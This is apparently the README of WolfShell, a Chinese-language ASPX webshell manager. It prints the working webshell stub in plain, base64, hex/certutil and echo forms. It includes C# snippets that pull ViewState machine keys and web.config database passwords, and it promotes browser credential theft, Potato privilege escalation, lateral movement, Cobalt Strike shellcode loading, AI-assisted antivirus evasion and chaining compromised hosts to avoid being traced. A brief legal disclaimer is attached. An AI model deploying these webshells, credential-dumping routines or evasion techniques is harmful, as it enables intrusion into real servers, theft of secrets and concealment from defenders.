
![WolfShell](http://www.18k.icu/img/wolfshell/wolf.png)

[![Author](https://img.shields.io/badge/Author-0x7556-blueviolet)](https://github.com/0x7556) 
[![WolfShell](https://img.shields.io/badge/WolfShell-Bin-ff69b4)](https://github.com/0x7556/wolfshell/releases) 
[![GitHub issues](https://img.shields.io/github/issues/0x7556/wolfshell)](https://github.com/0x7556/wolfshell/issues) 
[![Github Stars](https://img.shields.io/github/stars/0x7556/wolfshell)](https://github.com/0x7556/wolfshell) 
[![GitHub forks](https://img.shields.io/github/forks/0x7556/wolfshell)](https://github.com/0x7556/wolfshell)
[![GitHub license](https://img.shields.io/github/license/0x7556/wolfshell)](https://github.com/0x7556/wolfshell)

# 金刚狼：专为ASPX设计的高级WebShell管理工具

金刚狼是一款专为 ASPX 环境设计的高级 WebShell 管理工具，为安全研究人员和渗透测试人员提供强大的命令执行、提权、和内网穿透能力。它**集成了大量渗透工具**，**支持内存加载和无文件落地操作**，**实现WebShell下高隐蔽性的内网渗透**。

## 🚀 核心优势

*   高效隐蔽的通信： 采用 二进制流 传输协议，确保通信的高效性与隐蔽性。
*   端到端安全加密： 所有传输 Payload 均经过 AES加密 保护，且每次通信使用 随机密钥，保障数据安全。
*   无痕运行： 支持直接在 内存中加载并执行代码，最大程度避免在磁盘留下痕迹，显著提升操作隐蔽性和安全性。
*   内网级联WebShell控制： 通过现有已控的WebShell，无需部署代理或配置端口转发，即可直接连接并控制处于更深层内网环境中的WebShell节点，实现便捷高效的内网横向穿透。
*   Hacking后渗透：通过已控的 WebShell 在内存中加载渗透工具，无需部署代理或配置端口转发，即可执行多个渗透工具实现便捷高效的内网横向渗透。

## 🔥 功能特性

*   Shell：支持ASPX、ASHX、ASMX、HTTP、TCP、PS1、EXE、DLL，(目前仅开放ASPX、ASHX、内存马3种类型)。
*   内存马：ASPX一键注入内存马，任意路径访问，每次都可修改shell地址连接，干扰蓝队分析。
*   Cmd命令执行： 在目标系统上直接执行任意 CMD 命令。
*   文件管理： 在目标系统上枚举目录文件、新建文件、重命令、删除、设置文件时间等。
*   PowerShell执行： 支持执行 PowerShell 代码和命令。
*   Shellcode执行： 可在目标环境内直接执行原生的 Shellcode，一键上线Cobalt Strike、Metasploit。
*   C#代码执行： 支持动态加载与执行 C# 代码。
*   ValidationKey：提取ValidationKey、Validation、DecryptionKey等ViewState反序列化信息
*   web.config读取：提取数据库连接信息（数据库名、用户、密码）、SMTP/邮件服务器用户密码等。
*   端口转发： 实现本地端口到远程内网主机的映射，方便安全地访问内部网络服务。
*   HTTP代理： 一键内存注入Suo5高性能 HTTP 隧道代理工具。
*   EfsPotato： 利用系统服务漏洞进行权限提升。
*   BadPotato： 利用系统服务漏洞进行权限提升。
*   内网级联Cmd命令执行： 支持级联内网第2层 WebShell 执行 CMD 命令进行横向移动。
*   内网级联PowerShell执行： 支持级联内网第2层 WebShell 执行 PowerShell 命令进行横向移动。
*   SshCmd：SSH 远程命令执行工具，支持对内网主机的命令执行、文件上传下载实现横向移动。
*   MysqlCmd：MySQL 数据库连接工具，支持连接内网MySQL，执行查询、导入导出等数据库操作。
*   MssqlCmd：SQL Server数据库连接工具，支持连接内网数据库，执行查询、导入导出、横向移动、命令执行、Potato提权等。
*   SharpWeb：浏览器凭据抓取工具，支持提取已保存的 Chrome、Firefox、Edge 登录信息与凭据。
*   密码读取: IISpwd wifipwd FileZillaPwd firefoxpwd XshellPwd GetPwd FirefoxHistory FirefoxCookie
*   漏洞检测：MS17010 SMBGhost  HikvisionPoc ActivemqPoc Struts2Poc WeblogicPoc CVE-2022-36537  CVE-2024-47176 CVE-2022-27925 CVE-2024-27956
*   横向工具：wshell SmbExec WmiExec WmiExec2 AtExec MssqlCmd MmcExec ShellExec ShellBrowserExec
*   AI免杀：接入AI人工智能，聊个天就能免杀WebShell。
*   Ladon：内网渗透工具集，内存加载无文件落地，包含端口扫描、资产探测、密码审计、漏洞检测、漏洞利用、横向移动等。(工具在集成中，目前已完成10多种协议资产探测，其它模块暂未支持，和potato一样，无法集成所有工具，有些功能可能得使用原程序)


## 辅助功能

### AI人工智能

*   AI免杀：接入AI人工智能，聊个天就能免杀WebShell。

### 加密解密

*   支持加密算法： BASE64、HEX、ASCII、PowerShell、MD5、SHA1、SHA256、URL编码
*   支持解密算法： BASE64、HEX、ASCII、PowerShell、URL编码

## 安装与使用

1. **下载WolfShell**
```bash
git clone https://github.com/0x7556/wolfshell.git
```

2. **配置环境**
   - 确保目标环境支持ASPX、ASHX，并已正确配置。

3. **上传WolfShell**
   - 将WolfShell文件上传到目标服务器，支持ASPX、ASHX、内存马3种类型。

4. **访问WebShell**
   - 通过工具客户端连接WebShell，默认密码 WolfShell，修改密码可使用工具上的WolfHash加密。

## 使用环境

- **操作系统：** Windows
- **.NET 版本：** .NET Framework 4.8

## 命令 | 漏洞 GetShell

具备命令执行条件时，可通过以下4种方法写入 金刚狼 WebShell

### PowerShell写入wolf.aspx

```bash
powershell -Command "Set-Content -Path 'wolf.aspx' -Value '<%@ Page Language=\"C#\" %><%if (Request.Cookies.Count != 0) { byte[] k = Encoding.Default.GetBytes(\"ca63457538b9b1e0\"); System.IO.Stream s = Request.InputStream; byte[] c = new byte[s.Length]; s.Read(c, 0, c.Length); System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(\"K\").Equals(this); }%>'"
```
### PowerShell命令 Base64写入wolf.aspx

```bash
powershell -EncodedCommand UwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAIgB3AG8AbABmAC4AYQBzAHAAeAAiACAALQBWAGEAbAB1AGUAIAAnADwAJQBAACAAUABhAGcAZQAgAEwAYQBuAGcAdQBhAGcAZQA9ACIAQwAjACIAIAAlAD4APAAlAGkAZgAgACgAUgBlAHEAdQBlAHMAdAAuAEMAbwBvAGsAaQBlAHMALgBDAG8AdQBuAHQAIAAhAD0AIAAwACkAIAB7ACAAYgB5AHQAZQBbAF0AIABrACAAPQAgAEUAbgBjAG8AZABpAG4AZwAuAEQAZQBmAGEAdQBsAHQALgBHAGUAdABCAHkAdABlAHMAKAAiAGMAYQA2ADMANAA1ADcANQAzADgAYgA5AGIAMQBlADAAIgApADsAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtACAAcwAgAD0AIABSAGUAcQB1AGUAcwB0AC4ASQBuAHAAdQB0AFMAdAByAGUAYQBtADsAIABiAHkAdABlAFsAXQAgAGMAIAA9ACAAbgBlAHcAIABiAHkAdABlAFsAcwAuAEwAZQBuAGcAdABoAF0AOwAgAHMALgBSAGUAYQBkACgAYwAsACAAMAAsACAAYwAuAEwAZQBuAGcAdABoACkAOwAgAFMAeQBzAHQAZQBtAC4AUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQAuAEwAbwBhAGQAKABuAGUAdwAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBSAGkAagBuAGQAYQBlAGwATQBhAG4AYQBnAGUAZAAoACkALgBDAHIAZQBhAHQAZQBEAGUAYwByAHkAcAB0AG8AcgAoAGsALAAgAGsAKQAuAFQAcgBhAG4AcwBmAG8AcgBtAEYAaQBuAGEAbABCAGwAbwBjAGsAKABjACwAIAAwACwAIABjAC4ATABlAG4AZwB0AGgAKQApAC4AQwByAGUAYQB0AGUASQBuAHMAdABhAG4AYwBlACgAIgBLACIAKQAuAEUAcQB1AGEAbABzACgAdABoAGkAcwApADsAIAB9ACUAPgAnAA==
```

### cmd命令 echo & certutil 写入wolf.aspx

```bash
echo 3c25402050616765204c616e67756167653d2243232220253e3c2569662028526571756573742e436f6f6b6965732e436f756e7420213d203029207b20627974655b5d206b203d20456e636f64696e672e44656661756c742e476574427974657328223961613337623163323561303834653022293b2053797374656d2e494f2e53747265616d2073203d20526571756573742e496e70757453747265616d3b20627974655b5d2063203d206e657720627974655b732e4c656e6774685d3b20732e5265616428632c20302c20632e4c656e677468293b2053797374656d2e5265666c656374696f6e2e417373656d626c792e4c6f6164286e65772053797374656d2e53656375726974792e43727970746f6772617068792e52696a6e6461656c4d616e6167656428292e437265617465446563727970746f72286b2c206b292e5472616e73666f726d46696e616c426c6f636b28632c20302c20632e4c656e67746829292e437265617465496e7374616e636528224b22292e457175616c732874686973293b207d253e > w.hex && certutil -f -decodehex w.hex wolf.aspx && del w.hex
```

### cmd命令 echo 写入wolf.aspx

```bash
echo ^<%@ Page Language="C#" %^> > wolf.aspx && echo ^<% if (Request.Cookies.Count != 0) { >> wolf.aspx && echo byte[] k = Encoding.Default.GetBytes("ca63457538b9b1e0"); >> wolf.aspx && echo System.IO.Stream s = Request.InputStream; >> wolf.aspx && echo byte[] c = new byte[s.Length]; >> wolf.aspx && echo s.Read(c, 0, c.Length); >> wolf.aspx && echo System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("K").Equals(this); >> wolf.aspx && echo } %^> >> wolf.aspx
```

## 功能示例

### AI人工智能

使用AI兔杀金刚狼 WebShell 服务端
![aicode](http://www.18k.icu/img/wolfshell/aicode.png)

### 级联内网第3层WebShell 执行Cmd命令 

通过入口点 192.168.50.106 级联内网 192.168.50.159 再次级联下一层内网 192.168.50.69 WebShell 执行命令 

PS: 当然也可级联外网，比如抓了一些服务器当跳板，真正要搞的目标在第3层，这样就很难被追踪或溯源到你的真实IP了

![CmdShell示例](http://www.18k.icu/img/wolfshell/Lan2CmdShell.png)

### 级联内网第2层WebShell 执行Cmd命令

通过入口点 192.168.50.159 级联内网 192.168.50.106 WebShell执行命令

![CmdShell示例](http://www.18k.icu/img/wolfshell/LanCmdShell.png)


### WebShell入口点 执行Cmd命

![CmdShell示例](http://www.18k.icu/img/wolfshell/CmdShell.png)

### WebShell入口点 执行PowerShell命令/代码
* whoami代码实现非系统whoami
* 支持命令执行、代码执行 长度9K
* 输入info、ver可查看操作系统版本、位数、.NET版本、PowerShell版本信息
* 输入whoami、username可自动转成对应powershell代码查看用户信息
* Base64加密代码执行 示例 base64:ZWNobyBXb2xmU2hlbGw=

```csharp
PS C:\Users\admin>whoami
whoami: IIS APPPOOL\DefaultAppPool
Username: WIN-021V7TK43N5$

PS C:\Users\admin>info
Operating System Version: Microsoft Windows Server 2019 Datacenter 64 bit
Version Number: 10.0.17763

PowerShell Version:
5.1.17763.1

.NET Detailed Versions:
PSChildName Version   Release
----------- -------   -------
Client      4.7.03190  461814

PS C:\Users\admin>base64:ZWNobyBXb2xmU2hlbGw=
WolfShell

PS C:\Users\admin>Write-Host "Current User:`n$env:USERNAME"
Current User:
WIN-021V7TK43N5$
```

![PowerShell示例](http://www.18k.icu/img/wolfshell/PowerShell.png)


### 文件管理

![FileMgr](http://www.18k.icu/img/wolfshell/FileMgr.png)


### C#代码执行

#### 获取 ValidationKey 示例代码

*   ValidationKey：提取ValidationKey、Validation、DecryptionKey等ViewState反序列化信息

```csharp

using System;
using System.Reflection;
using System.Web.Configuration;
public class Eval
{
public string eval(Object obj)
{
var sy = Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
var mkt = sy.GetType("System.Web.Configuration.MachineKeySection");
var gac = mkt.GetMethod("GetApplicationConfig", BindingFlags.Static | BindingFlags.NonPublic);
var cg = (MachineKeySection)gac.Invoke(null, new object[0]);
return "ValidationKey: " + cg.ValidationKey + " | " + "Validation: " + cg.Validation + " | " + "DecryptionKey: " + cg.DecryptionKey + " | " + "Decryption: " + cg.Decryption + " | " + "CompatibilityMode: " + cg.CompatibilityMode;
}
}

```

![C#代码示例](http://www.18k.icu/img/wolfshell/CodeViewKey.png)

#### 扫描C段存活主机 示例代码
```csharp

using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
public class Eval
{
public string eval(Object obj)
{
StringBuilder iplist = new StringBuilder();
string baseIP = "192.168.1.";
PingOptions options = new PingOptions();
options.DontFragment = true;
var tasks = new Task[254];
for (int i = 1; i < 255; i++)
{
int ipSuffix = i;
tasks[i - 1] = Task.Run(() =>
{
using (Ping myPing = new Ping())
{
PingReply reply = myPing.Send(baseIP + ipSuffix, 120);
if (reply.Status == IPStatus.Success)
{
lock (iplist)
{
iplist.AppendLine("Alive IP: " + reply.Address.ToString());
}
}
}
});
}
Task.WaitAll(tasks);
return iplist.ToString();
}
}


```


![C#代码示例](http://www.18k.icu/img/wolfshell/CodeCping.png)



#### CMD命令执行 示例代码

```csharp

using System;
using System.Diagnostics;
public class Eval
{
public string eval(Object obj)
{
try
{
Process process = new Process();
process.StartInfo.FileName = "cmd.exe";
process.StartInfo.Arguments = "/c whoami";
process.StartInfo.UseShellExecute = false;
process.StartInfo.RedirectStandardOutput = true;
process.Start();
string result = process.StandardOutput.ReadToEnd();
process.WaitForExit();
return result;
}
catch (Exception ex)
{
return "Error occurred: " + ex.Message;
}
}
}


```

![C#代码示例](http://www.18k.icu/img/wolfshell/CodeCmd.png)


#### 获取web.config密码 示例代码

*   web.config读取：提取数据库连接信息（数据库名、用户、密码）、SMTP/邮件服务器用户密码等。

```csharp

using System;
using System.Configuration;
using System.Text;
public class Eval
{
public string eval(Object obj)
{
try
{
var connectionStrings = ConfigurationManager.ConnectionStrings;
var appSettings = ConfigurationManager.AppSettings;
var result = new StringBuilder();
foreach (ConnectionStringSettings connectionString in connectionStrings)
{
result.AppendLine("Connection string name: " + connectionString.Name);
result.AppendLine("Connection string value: " + connectionString.ConnectionString);
result.AppendLine();
}
result.AppendLine();
foreach (string key in appSettings.AllKeys)
{
result.AppendLine("Key: " + key + ", Value: " + appSettings[key]);
}
return result.ToString();
}
catch (Exception ex)
{
return "Error occurred: " + ex.Message;
}
}
}


```

![C#代码示例](http://www.18k.icu/img/wolfshell/CodeWebConfig.png)


###  加密解密算法

支持加密算法： BASE64、HEX、ASCII、PowerShell、MD5、SHA1、SHA256、URL编码
支持解密算法： BASE64、HEX、ASCII、PowerShell、URL编码

#### 金刚狼密码

![WolfHash](http://www.18k.icu/img/wolfshell/WolfHash.png)

#### ASCII码加密

![WolfShell](http://www.18k.icu/img/wolfshell/ascii.png)

#### BASE64解密

![WolfShell](http://www.18k.icu/img/wolfshell/unBase64.png)

#### HEX十六进制解密

![WolfShell](http://www.18k.icu/img/wolfshell/unhex.png)



### Potato提权示例

#### efspotato提权

![EfsPotato示例](http://www.18k.icu/img/wolfshell/EfsPotato.png)

#### badpotato提权


![BadPotato示例](http://www.18k.icu/img/wolfshell/BadPotato.png)

### 内网扫描示例

![NetScan示例](http://www.18k.icu/img/wolfshell/NetScan.png)

### 端口转发示例

![端口转发示例](http://www.18k.icu/img/wolfshell/PortTran.png)


### HTTP代理示例

![端口转发示例](http://www.18k.icu/img/wolfshell/Suo5Tunnel.png)

## Hacking后渗透

### SSH远程命令执行示例

```bash
Usage:

sshcmd 192.168.50.128 22 root toor id
sshcmd 192.168.50.128 22 root toor download /tmp/down.rar c:\down.rar
sshcmd 192.168.50.128 22 root toor upload c:\upload.rar /tmp/upload.rar

Keybord
sshcmd 192.168.50.128 22 root toor download2 /tmp/down.rar c:\down.rar
sshcmd 192.168.50.128 22 root toor upload2 c:\upload.rar /tmp/upload.rar
```

![Hacking](http://www.18k.icu/img/wolfshell/sshcmd.png)

### Mysql数据库连接示例

```bash
mysqlcmd host port user pass dbname sqlstr
mysqlcmd host port user pass dbname sqlb64

Demo:
mysqlcmd 192.168.50.139 3306 root WolfShell mysql info
mysqlcmd 192.168.50.139 3306 root WolfShell mysql ""SELECT VERSION(); ""
mysqlcmd 192.168.50.139 3306 root WolfShell mysql ""SELECT 3+5 ""
mysqlcmd 192.168.50.139 3306 root WolfShell mysql c2VsZWN0IDMrNQ==";
```

![Hacking](http://www.18k.icu/img/wolfshell/mysqlcmd.png)

### 读取浏览器密码示例

*   SharpWeb：浏览器凭据抓取工具，支持提取已保存的 Chrome、Firefox、Edge 登录信息与凭据。

```bash
Usage:
    SharWeb arg0 [arg1 arg2 ...]

Arguments:
    all       - Retrieve all Chrome, FireFox and IE/Edge credentials.
    full      - The same as 'all'
    chrome    - Fetch saved Chrome logins. e.g. -d Directory
    firefox   - Fetch saved FireFox logins. e.g. -p masterkey -d Directory
    edge      - Fetch saved Internet Explorer/Microsoft Edge logins.

Demo:
    SharWeb all
    SharWeb chrome
    SharWeb chrome -d C:\Output
    SharWeb firefox -p mymasterkey -d C:\Output
    SharWeb edge
=======================================================================
```

![Hacking](http://www.18k.icu/img/wolfshell/SharpWeb.png)

### Ladon内网渗透工具示例
20251106 主要集成以下探测功能，其它功能暂未支持

```bash
Usage:

Ladon whoami

Ladon 192.168.50.159/24 ICMP         ICMP存活主机探测
Ladon 192.168.50.159/24 PortScan     开放端口服务扫描
Ladon 192.168.50.159/24 WebScan      网站标题、中间件

Ladon 192.168.50.159/24 SmbInfo      SMB存活主机探测、NTLM系统信息
Ladon 192.168.50.159/24 NbtInfo      NBT存活主机探测、NTLM系统信息
Ladon 192.168.50.159/24 WmiInfo      WMI存活主机探测、NTLM系统信息
Ladon 192.168.50.159/24 LdapInfo     LDAP存活主机探测、NTLM系统信息
Ladon 192.168.50.159/24 RdpInfo      RDP存活主机探测、NTLM系统信息
Ladon 192.168.50.159/24 SmtpInfo     SMTP存活主机探测、NTLM系统信息
Ladon 192.168.50.159/24 HttpInfo     HTTP存活主机探测、NTLM系统信息
Ladon 192.168.50.159/24 WinrmInfo    Winrm存活主机探测、NTLM系统信息
Ladon 192.168.50.159/24 MssqlInfo    SQL数据库主机探测、NTLM系统信息

Ladon 192.168.50.159/24 FtpInfo      FTP存活主机探测
Ladon 192.168.50.159/24 T3Info       Weblogic协议探测
Ladon 192.168.50.159/24 CiscoInfo    Cisco路由器探测
Ladon 192.168.50.159/24 SnmpInfo   SNMP设备探测，如路由器、交换机等

Ladon 192.168.50.159/24 OxidInfo     Windows多网卡主机探测
Ladon 192.168.50.159/24 EthInfo      Windows多网卡主机探测
Ladon http://0x7556.org WPinfo     WordPress版本、插件探测、漏洞
Ladon 192.168.50.159/24 DnsInfo      DNS存活主机探测、域名识别


```

#### SMB协议NTLM信息OS操作系统识别
![Hacking](http://www.18k.icu/img/wolfshell/SmbInfo.png)

#### WebScan 网站标题、中间件扫描
![Hacking](http://www.18k.icu/img/wolfshell/WebScan.png)


### 端口扫描 示例


```bash

PortScan 192.168.50.159
PortScan 192.168.50.159 80，22，135，445

```

![Hacking](http://www.18k.icu/img/wolfshell/PortScan.png)

## MS17010 漏洞检测

![WolfShell](http://www.18k.icu/img/wolfshell/ms17010.png)


## SQL Server横向移动 数据库提权

![WolfShell](http://www.18k.icu/img/wolfshell/MssqlCmd.png)


## Xshell密码读取

![WolfShell](http://www.18k.icu/img/wolfshell/XshellPwd.png)


## webkey 密码读取

解析web.config 获取ValidationKey (ViewState反序列化 Exchange、SharePoint后门)

![WolfShell](http://www.18k.icu/img/wolfshell/webkey.png)

## CVE-2025-55182 Next.js Rce 漏洞利用
[+]CVE-2025-55182	CVE-2025-55182 Next.js Rce 漏洞利用
[+]NextJSexp		CVE-2025-55182 Next.js Rce 漏洞利用

![WolfShell](http://www.18k.icu/img/wolfshell/nextjsexp.png)

## 免责声明

- 使用WolfShell时，请遵循相关法律法规，确保在授权的环境中进行测试和使用。
- 本工具仅供教育和研究目的，任何滥用行为将由用户自行承担后果。

## 问题反馈

欢迎任何形式的贡献！请提交问题、建议或拉取请求。

## 许可证

本项目采用MIT许可证，详细信息请参见[LICENSE](LICENSE)文件。

## 资源链接

已集成或即将加入的工具，工具采用内存加载，有些工具未解决兼容性问题，如(SweetPotato\GodPotato，可能得上传目标在cmd下执行)

* Ladon（内网渗透框架）：https://github.com/k8gege/Ladon    (功能非常丰富，正在研究中)
* gpt4free（AI免费API）：https://github.com/xtekky/gpt4free
* SharpWeb(浏览器密码读取)：https://github.com/djhohnstein/SharpWeb
* suo5代理(HTTP隧道代理)：https://github.com/zema1/suo5
* BadPotato(提权工具)：https://github.com/BeichenDream/BadPotato
* EfsPotato(提权工具)：https://github.com/zcgonvh/EfsPotato
* CVE-2025-59287漏洞 .net反序列化 内存正向马: https://github.com/0x7556/CVE-2025-59287

## 关注

* 欢迎大家关注公众号和Github，您的关注、点赞、反馈，将是软件更新的动力来源!
  
![WolfShell](http://www.18k.icu/img/join.png)
